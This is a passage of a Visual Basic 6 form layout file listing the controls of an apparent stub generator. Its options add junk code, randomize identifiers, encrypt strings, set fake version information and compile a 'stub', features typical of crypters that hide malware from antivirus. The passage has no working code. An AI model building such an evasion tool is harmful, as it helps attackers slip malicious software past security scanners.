         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit Text4 
         Height          =   255
         Left            =   1440
         TabIndex        =   288
         Top             =   1080
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit text6 
         Height          =   255
         Left            =   1440
         TabIndex        =   289
         Top             =   720
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit Txt1 
         Height          =   255
         Left            =   1440
         TabIndex        =   290
         Top             =   360
         Width           =   495
         _Version        =   851968
         _ExtentX        =   873
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit Text3 
         Height          =   255
         Left            =   2040
         TabIndex        =   291
         Top             =   360
         Width           =   495
         _Version        =   851968
         _ExtentX        =   873
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit text2 
         Height          =   255
         Left            =   2640
         TabIndex        =   292
         Top             =   360
         Width           =   495
         _Version        =   851968
         _ExtentX        =   873
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin VB.Label Label7 
         Caption         =   "Version Information"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   282
         Top             =   360
         Width           =   1335
      End
      Begin VB.Label Label8 
         Caption         =   "Copyright"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   281
         Top             =   1080
         Width           =   735
      End
      Begin VB.Label Label9 
         Caption         =   "File Description"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   280
         Top             =   1440
         Width           =   1095
      End
      Begin VB.Label Label10 
         Caption         =   "Company Name"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   279
         Top             =   1800
         Width           =   1095
      End
      Begin VB.Label Label11 
         Caption         =   "Command Line Args"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   278
         Top             =   2160
         Width           =   1335
      End
      Begin VB.Label Label13 
         Caption         =   "Comments"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   277
         Top             =   720
         Width           =   735
      End
      Begin VB.Label Label12 
         Caption         =   "Legal Trademarks"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   276
         Top             =   2520
         Width           =   1215
      End
      Begin VB.Label Label14 
         Caption         =   "Product Name"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   275
         Top             =   2880
         Width           =   975
      End
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   47
      Left            =   13920
      TabIndex        =   272
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   46
      Left            =   13680
      TabIndex        =   271
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   45
      Left            =   13440
      TabIndex        =   270
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   44
      Left            =   13200
      TabIndex        =   269
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   43
      Left            =   12960
      TabIndex        =   268
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   42
      Left            =   12720
      TabIndex        =   267
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   41
      Left            =   12480
      TabIndex        =   266
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   40
      Left            =   12240
      TabIndex        =   265
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   39
      Left            =   12000
      TabIndex        =   264
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   38
      Left            =   11760
      TabIndex        =   263
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   37
      Left            =   11520
      TabIndex        =   262
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   36
      Left            =   11280
      TabIndex        =   261
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   35
      Left            =   11040
      TabIndex        =   260
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   34
      Left            =   10800
      TabIndex        =   259
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   33
      Left            =   10560
      TabIndex        =   258
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   32
      Left            =   10200
      TabIndex        =   257
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   31
      Left            =   9960
      TabIndex        =   256
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   30
      Left            =   9720
      TabIndex        =   255
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   29
      Left            =   9480
      TabIndex        =   254
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   28
      Left            =   9240
      TabIndex        =   253
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   27
      Left            =   9000
      TabIndex        =   252
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   26
      Left            =   8760
      TabIndex        =   251
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   25
      Left            =   8520
      TabIndex        =   250
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   24
      Left            =   8280
      TabIndex        =   249
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   23
      Left            =   13920
      TabIndex        =   248
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   22
      Left            =   13680
      TabIndex        =   247
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   21
      Left            =   13440
      TabIndex        =   246
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   20
      Left            =   13200
      TabIndex        =   245
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   19
      Left            =   12960
      TabIndex        =   244
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   18
      Left            =   12720
      TabIndex        =   243
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   17
      Left            =   12480
      TabIndex        =   242
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   16
      Left            =   12240
      TabIndex        =   241
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   15
      Left            =   12000
      TabIndex        =   240
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   14
      Left            =   11760
      TabIndex        =   239
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   13
      Left            =   11520
      TabIndex        =   238
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   12
      Left            =   11280
      TabIndex        =   237
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   11
      Left            =   11040
      TabIndex        =   236
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   10
      Left            =   10800
      TabIndex        =   235
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   9
      Left            =   10560
      TabIndex        =   234
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   8
      Left            =   10200
      TabIndex        =   233
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   7
      Left            =   9960
      TabIndex        =   232
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   6
      Left            =   9720
      TabIndex        =   231
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   5
      Left            =   9480
      TabIndex        =   230
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   4
      Left            =   9240
      TabIndex        =   229
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   3
      Left            =   9000
      TabIndex        =   228
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   2
      Left            =   8760
      TabIndex        =   227
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   1
      Left            =   8520
      TabIndex        =   226
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtType 
      Height          =   285
      Index           =   0
      Left            =   8280
      TabIndex        =   225
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   11
      Left            =   14520
      TabIndex        =   223
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   10
      Left            =   14280
      TabIndex        =   222
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   9
      Left            =   14040
      TabIndex        =   221
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   8
      Left            =   13800
      TabIndex        =   220
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   7
      Left            =   13560
      TabIndex        =   219
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   6
      Left            =   13320
      TabIndex        =   218
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   5
      Left            =   13080
      TabIndex        =   217
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   4
      Left            =   12840
      TabIndex        =   216
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   3
      Left            =   12600
      TabIndex        =   215
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   2
      Left            =   12360
      TabIndex        =   214
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   1
      Left            =   12120
      TabIndex        =   213
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtParam 
      Height          =   285
      Index           =   0
      Left            =   11880
      TabIndex        =   212
      Top             =   7200
      Width           =   185
   End
   Begin VB.TextBox TxtCls 
      Height          =   285
      Index           =   8
      Left            =   14400
      TabIndex        =   211
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtCls 
      Height          =   285
      Index           =   7
      Left            =   14640
      TabIndex        =   210
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtCls 
      Height          =   285
      Index           =   6
      Left            =   14880
      TabIndex        =   209
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtCls 
      Height          =   285
      Index           =   5
      Left            =   15120
      TabIndex        =   208
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtCls 
      Height          =   285
      Index           =   4
      Left            =   14160
      TabIndex        =   207
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox TxtMod 
      Height          =   285
      Index           =   3
      Left            =   12120
      TabIndex        =   206
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtMod 
      Height          =   285
      Index           =   2
      Left            =   12360
      TabIndex        =   205
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtMod 
      Height          =   285
      Index           =   1
      Left            =   12600
      TabIndex        =   204
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtMod 
      Height          =   285
      Index           =   0
      Left            =   12840
      TabIndex        =   203
      Top             =   6240
      Width           =   185
   End
   Begin VB.TextBox TxtMod 
      Height          =   285
      Index           =   4
      Left            =   11880
      TabIndex        =   202
      Top             =   6240
      Width           =   185
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Clear All Fields"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3120
      TabIndex        =   201
      Top             =   5400
      Width           =   1625
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Generate + Compile Stub"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   6600
      TabIndex        =   200
      Top             =   5280
      Width           =   2775
   End
   Begin VB.Frame Frame4 
      Caption         =   "Compilation"
      Height          =   855
      Left            =   1440
      TabIndex        =   197
      Top             =   7800
      Width           =   2775
      Begin VB.OptionButton Option2 
         Caption         =   "Compile To P-Code"
         Height          =   255
         Left            =   120
         TabIndex        =   199
         Top             =   240
         Value           =   -1  'True
         Width           =   2175
      End
      Begin VB.OptionButton Option1 
         Caption         =   "Compile To Native Code"
         Height          =   255
         Left            =   120
         TabIndex        =   198
         Top             =   480
         Width           =   2175
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Add Junk Code"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2895
      Left            =   6600
      TabIndex        =   192
      Top             =   0
      Width           =   2775
      Begin VB.CheckBox Check21 
         Caption         =   "Fake Loops"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   316
         Top             =   2160
         Width           =   1095
      End
      Begin VB.CheckBox Check20 
         Caption         =   "Fake If's"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   314
         Top             =   1800
         Width           =   1095
      End
      Begin VB.CheckBox Check14 
         Caption         =   "Fake Apis"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   273
         Top             =   2520
         Width           =   1095
      End
      Begin VB.CheckBox Check11 
         Caption         =   "Fake Dim's"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   196
         Top             =   1440
         Width           =   1095
      End
      Begin VB.CheckBox Check9 
         Caption         =   "Fake Go-To's"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   195
         Top             =   1080
         Width           =   1215
      End
      Begin VB.CheckBox Check8 
         Caption         =   "Fake Functions"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   194
         Top             =   720
         Width           =   1275
      End
      Begin VB.CheckBox Check7 
         Caption         =   "Fake Subs"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   193
         Top             =   360
         Width           =   1095
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   315
         Index           =   0
         Left            =   1680
         TabIndex        =   309
         Top             =   360
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   315
         Index           =   1
         Left            =   1680
         TabIndex        =   310
         Top             =   720
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   315
         Index           =   2
         Left            =   1680
         TabIndex        =   311
         Top             =   1080
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   315
         Index           =   3
         Left            =   1680
         TabIndex        =   312
         Top             =   1440
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   315
         Index           =   4
         Left            =   1680
         TabIndex        =   313
         Top             =   2520
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   315
         Index           =   5
         Left            =   1680
         TabIndex        =   315
         Top             =   1800
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   315
         Index           =   6
         Left            =   1680
         TabIndex        =   317
         Top             =   2160
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Preset Settings"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2535
      Left            =   120
      TabIndex        =   186
      Top             =   0
      Width           =   2775
      Begin VB.CheckBox Check13 
         Caption         =   "Randomize Module Names"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   324
         Top             =   1800
         Value           =   1  'Checked
         Width           =   2415
      End
      Begin VB.CheckBox Check6 
         Caption         =   "Randomize Sub Names"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   191
         Top             =   720
         Value           =   1  'Checked
         Width           =   2415
      End
      Begin VB.CheckBox Check5 
         Caption         =   "Encrypt All Strings"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   190
         Top             =   2160
         Value           =   1  'Checked
         Width           =   2415
      End
      Begin VB.CheckBox Check4 
         Caption         =   "Randomize Variables"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   189
         Top             =   1080
         Value           =   1  'Checked
         Width           =   2415
      End
      Begin VB.CheckBox Check3 
         Caption         =   "Randomize Constants"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   188
         Top             =   1440
         Value           =   1  'Checked
         Width           =   2415
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Randomize Function Names"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   187
         Top             =   360
         Value           =   1  'Checked
         Width           =   2415
      End
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   20
      Left            =   14040
      TabIndex        =   185
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   19
      Left            =   13800
      TabIndex        =   184
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   18
      Left            =   12840
      TabIndex        =   178
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   17
      Left            =   13080
      TabIndex        =   177
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   16
      Left            =   13320
      TabIndex        =   176
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   15
      Left            =   13560
      TabIndex        =   175
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   14
      Left            =   14520
      TabIndex        =   174
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   13
      Left            =   12120
      TabIndex        =   173
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   12
      Left            =   12360
      TabIndex        =   172
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   11
      Left            =   12600
      TabIndex        =   171
      Top             =   5640
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   10
      Left            =   14280
      TabIndex        =   170
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   9
      Left            =   11880
      TabIndex        =   169
      Top             =   5640
      Width           =   185
   End
